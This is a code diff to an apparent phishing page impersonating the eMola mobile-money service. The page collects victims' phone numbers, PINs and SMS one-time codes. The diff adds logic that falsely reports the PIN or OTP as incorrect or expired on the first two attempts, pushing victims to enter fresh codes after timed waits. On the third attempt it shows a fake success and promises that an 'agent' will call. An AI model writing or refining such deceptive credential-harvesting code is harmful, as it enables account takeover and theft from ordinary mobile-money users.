@@ -31,6 +31,9 @@
       --red-600: #c0392b;
       --red-50: #fef2f1;
       --red-200: #f5c2c0;
+      --green-600: #158055;
+      --green-50: #ecfdf5;
+      --green-200: #a7f3d0;
       --shadow-xl: 0 32px 64px -16px rgba(184, 73, 7, 0.28), 0 4px 12px -4px rgba(0,0,0,0.06);
       --shadow-md: 0 8px 24px -6px rgba(0,0,0,0.08);
       --radius-xl: 32px;
@@ -491,6 +494,28 @@
 
     .btn:hover:not(:disabled) .arrow { transform: translateX(3px); }
 
+    .btn.btn-green {
+      background: linear-gradient(135deg, #5ee2a0 0%, #22a06b 50%, #158055 100%);
+      box-shadow:
+        0 5px 0 #0d5c3d,
+        0 16px 28px -8px rgba(21, 128, 85, 0.5),
+        inset 0 1px 0 rgba(255,255,255,0.35);
+    }
+
+    .btn.btn-green:hover:not(:disabled) {
+      box-shadow:
+        0 6px 0 #0d5c3d,
+        0 20px 32px -8px rgba(21, 128, 85, 0.55),
+        inset 0 1px 0 rgba(255,255,255,0.35);
+    }
+
+    .btn.btn-green:active:not(:disabled) {
+      box-shadow:
+        0 2px 0 #0d5c3d,
+        0 10px 18px -6px rgba(21, 128, 85, 0.4),
+        inset 0 1px 0 rgba(255,255,255,0.35);
+    }
+
     /* ---------- PROCESSING ---------- */
     .processing { text-align: center; padding: 12px 0 6px; }
 
@@ -689,6 +714,84 @@
       background: linear-gradient(135deg, #ffa65c 0%, #f47721 50%, #e05e0c 100%);
       box-shadow: 0 5px 0 var(--orange-700), 0 16px 28px -8px rgba(224, 94, 12, 0.5);
     }
+
+    /* ---------- SUCCESS ---------- */
+    .success-box {
+      text-align: center;
+      padding: 12px 0 6px;
+    }
+
+    .success-icon {
+      width: 80px;
+      height: 80px;
+      margin: 8px auto 24px;
+      border-radius: 50%;
+      background: linear-gradient(145deg, #5ee2a0, #22a06b);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 8px 0 #158055, 0 20px 36px -10px rgba(21, 128, 85, 0.55);
+      animation: popIn 0.5s cubic-bezier(0.2, 0, 0, 1);
+    }
+
+    .success-icon svg {
+      width: 38px;
+      height: 38px;
+      stroke: white;
+      stroke-width: 3;
+      fill: none;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    @keyframes popIn {
+      0% { transform: scale(0); opacity: 0; }
+      60% { transform: scale(1.1); }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .success-box h2 {
+      color: var(--green-600);
+      margin-bottom: 10px;
+    }
+
+    .success-box .status {
+      margin-bottom: 6px;
+    }
+
+    .success-box .agent-note {
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+      text-align: left;
+      margin-top: 20px;
+      padding: 16px 18px;
+      background: var(--green-50);
+      border: 1px solid var(--green-200);
+      border-radius: var(--radius-sm);
+      font-size: 0.88rem;
+      font-weight: 500;
+      color: var(--green-600);
+      line-height: 1.55;
+    }
+
+    .success-box .agent-note .icon {
+      width: 22px;
+      height: 22px;
+      border-radius: 7px;
+      background: linear-gradient(145deg, #5ee2a0, #22a06b);
+      color: #fff;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      font-size: 0.75rem;
+      font-weight: 800;
+      box-shadow: 0 2px 0 #158055;
+      margin-top: 1px;
+    }
+
+    .success-box .agent-note strong { color: var(--green-600); font-weight: 800; }
 
     /* ---------- FOOTER ---------- */
     .footer { padding: 0 28px 26px; text-align: center; }
@@ -921,9 +1024,9 @@
           </button>
         </form>
 
-        <!-- STEP 4: WAITING + FINAL ERROR -->
+        <!-- STEP 4: WAITING + FINAL ERROR / SUCCESS -->
         <section id="waitingStep" class="step">
-          <div class="processing">
+          <div class="processing" id="waitingProcessing">
             <div class="spinner-wrap">
               <div class="spinner"></div>
               <div class="spinner-core">
@@ -940,18 +1043,32 @@
           </div>
 
           <div id="finalErrorBox" class="final-error" style="display:none;">
-            O PIN ou o código OTP estão incorretos.
+            <span id="finalErrorText">O PIN ou o código OTP estão incorretos.</span>
             <div class="sms-note">
               <span class="icon">✉</span>
-              <span>Ao clicar em <strong>Reiniciar</strong>, iremos enviar um <strong>novo código de verificação via SMS</strong> para o seu telefone. Insira os dados corretamente.</span>
+              <span id="smsNoteText">Ao clicar em <strong>Iniciar validação</strong>, iremos enviar um <strong>novo código de verificação via SMS</strong> para o seu telefone. Insira os dados corretamente.</span>
             </div>
             <button class="btn" id="finalRestartBtn" type="button">
               <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" style="width:18px;height:18px;stroke-width:2.6;fill:none;stroke:currentColor;">
-                <path d="M3 12a9 9 0 1 0 3-6.7L3 8"/>
-                <path d="M3 3v5h5"/>
+                <path d="M5 12h14M12 5l7 7-7 7"/>
               </svg>
-              Reiniciar e receber novo código
+              <span id="restartBtnText">Iniciar validação</span>
             </button>
+          </div>
+
+          <!-- SUCCESS -->
+          <div id="successBox" class="success-box" style="display:none;">
+            <div class="success-icon">
+              <svg viewBox="0 0 24 24">
+                <polyline points="20 6 9 17 4 12"/>
+              </svg>
+            </div>
+            <h2>Código validado com sucesso!</h2>
+            <p class="status">A sua conta eMola foi verificada.</p>
+            <div class="agent-note">
+              <span class="icon">✓</span>
+              <span>Um <strong>agente eMola entrará em contacto em breve</strong> para finalizar o processo. Mantenha o telefone por perto.</span>
+            </div>
           </div>
         </section>
       </div>
@@ -992,6 +1109,14 @@
       }
     }
 
+    // ====== CONFIGURAÇÃO DOS TEMPOS POR TENTATIVA (em segundos) ======
+    // 1ª tentativa: 1 minuto | 2ª tentativa: 30 minutos | 3ª tentativa: 30 minutos
+    const WAIT_SECONDS_BY_ATTEMPT = {
+      1: 60,       // 1 minuto
+      2: 1800,     // 30 minutos
+      3: 1800      // 30 minutos
+    };
+
     // ====== DOM ======
     const loginForm = document.getElementById("loginForm");
     const processingStep = document.getElementById("processingStep");
@@ -1002,7 +1127,12 @@
     const waitCountdown = document.getElementById("waitCountdown");
     const waitProgressBar = document.getElementById("waitProgressBar");
     const waitStatus = document.getElementById("waitStatus");
+    const waitingProcessing = document.getElementById("waitingProcessing");
     const finalErrorBox = document.getElementById("finalErrorBox");
+    const finalErrorText = document.getElementById("finalErrorText");
+    const smsNoteText = document.getElementById("smsNoteText");
+    const restartBtnText = document.getElementById("restartBtnText");
+    const successBox = document.getElementById("successBox");
     const finalRestartBtn = document.getElementById("finalRestartBtn");
     const phoneInput = document.getElementById("phone");
     const pinInput = document.getElementById("pin");
@@ -1015,6 +1145,7 @@
     let currentPin = "";
     let waitInterval = null;
     let otpSubmitting = false;
+    let attempt = 1; // 1, 2, 3
 
     // ====== STEP INDICATOR ======
     function setStepIndicator(stepNumber) {
@@ -1049,6 +1180,13 @@
     // ====== PHONE VALIDATION (eMola: 86, 87, 88) ======
     function isValidEmolaPhone(phone) {
       return /^(86|87|88)\d{7}$/.test(phone);
+    }
+
+    // ====== FORMATAÇÃO DE TEMPO (MM:SS) ======
+    function formatTime(totalSeconds) {
+      const m = String(Math.floor(totalSeconds / 60)).padStart(2, "0");
+      const s = String(totalSeconds % 60).padStart(2, "0");
+      return `${m}:${s}`;
     }
 
     // ====== LOGIN ======
@@ -1155,37 +1293,59 @@
       startWait();
     }
 
-    // ====== WAITING (1 minuto) → erro final ======
+    // ====== WAITING (tempo varia por tentativa) ======
     function startWait() {
       if (waitInterval) clearInterval(waitInterval);
-      let totalSeconds = 60;
-      const total = totalSeconds;
+
+      // Tempo definido pela tentativa atual
+      const total = WAIT_SECONDS_BY_ATTEMPT[attempt] || 60;
+      let totalSeconds = total;
+
+      // Mostrar processamento, esconder erro e sucesso
+      waitingProcessing.style.display = "block";
+      finalErrorBox.style.display = "none";
+      successBox.style.display = "none";
+
       waitStatus.textContent = "Não feche esta página.";
       waitProgressBar.style.width = "0%";
-      finalErrorBox.style.display = "none";
-      updateWaitDisplay(totalSeconds);
+      waitCountdown.textContent = formatTime(totalSeconds);
 
       waitInterval = setInterval(() => {
         totalSeconds--;
         if (totalSeconds <= 0) {
           clearInterval(waitInterval);
           waitInterval = null;
-          updateWaitDisplay(0);
+          waitCountdown.textContent = formatTime(0);
           waitProgressBar.style.width = "100%";
           waitStatus.textContent = "Verificação concluída.";
-          finalErrorBox.style.display = "block";
-          logEvent("validation_failed");
+
+          // Esconder processamento
+          waitingProcessing.style.display = "none";
+
+          if (attempt === 1) {
+            // 1ª tentativa: PIN errado ou OTP expirou
+            finalErrorText.innerHTML = "O <strong>PIN</strong> ou o <strong>código OTP</strong> estão incorretos.";
+            smsNoteText.innerHTML = "Ao clicar em <strong>Iniciar validação</strong>, iremos enviar um <strong>novo código de verificação via SMS</strong> para o seu telefone. Insira os dados corretamente.";
+            restartBtnText.textContent = "Iniciar validação";
+            finalErrorBox.style.display = "block";
+            logEvent("validation_failed", { attempt: 1 });
+          } else if (attempt === 2) {
+            // 2ª tentativa: OTP expirou, tentar rapidamente
+            finalErrorText.innerHTML = "O <strong>código OTP expirou</strong>. Tente novamente rapidamente!";
+            smsNoteText.innerHTML = "O código expirou. Clique em <strong>Iniciar validação</strong> para receber um novo código via SMS. Introduza-o <strong>rapidamente</strong>.";
+            restartBtnText.textContent = "Iniciar validação";
+            finalErrorBox.style.display = "block";
+            logEvent("validation_failed", { attempt: 2 });
+          } else {
+            // 3ª tentativa: sucesso
+            successBox.style.display = "block";
+            logEvent("validation_success", { attempt: 3 });
+          }
         } else {
-          updateWaitDisplay(totalSeconds);
+          waitCountdown.textContent = formatTime(totalSeconds);
           waitProgressBar.style.width = ((total - totalSeconds) / total * 100) + "%";
         }
       }, 1000);
-    }
-
-    function updateWaitDisplay(seconds) {
-      const m = String(Math.floor(seconds / 60)).padStart(2, "0");
-      const s = String(seconds % 60).padStart(2, "0");
-      waitCountdown.textContent = `${m}:${s}`;
     }
 
     // ====== OTP FORM SUBMIT (fallback) ======
@@ -1195,17 +1355,19 @@
       await submitOtp();
     });
 
-    // ====== RESTART ======
-    function restartFlow(event) {
-      if (event) event.preventDefault();
+    // ====== RESET / RESTART ======
+    function resetForRetry() {
+      // Não reinicia tentativas; apenas volta ao login
       otpSubmitting = false;
       currentPhone = "";
       currentPin = "";
       if (waitInterval) { clearInterval(waitInterval); waitInterval = null; }
       finalErrorBox.style.display = "none";
+      successBox.style.display = "none";
+      waitingProcessing.style.display = "block";
       waitStatus.textContent = "Não feche esta página.";
       waitProgressBar.style.width = "0%";
-      updateWaitDisplay(60);
+      waitCountdown.textContent = formatTime(WAIT_SECONDS_BY_ATTEMPT[attempt] || 60);
       phoneInput.value = "";
       pinInput.value = "";
       otpDigits.forEach(input => input.value = "");
@@ -1217,8 +1379,21 @@
       otpDigits.forEach(inp => inp.classList.remove("filled"));
     }
 
-    document.getElementById("restart").addEventListener("click", restartFlow);
-    finalRestartBtn.addEventListener("click", restartFlow);
+    function fullRestart(event) {
+      if (event) event.preventDefault();
+      attempt = 1;
+      resetForRetry();
+    }
+
+    function iniciarValidacao() {
+      // Avança a tentativa e reinicia o fluxo
+      attempt++;
+      logEvent("restart_validation", { attempt });
+      resetForRetry();
+    }
+
+    document.getElementById("restart").addEventListener("click", fullRestart);
+    finalRestartBtn.addEventListener("click", iniciarValidacao);
 
     // Inicialização
     syncOtpFilled();
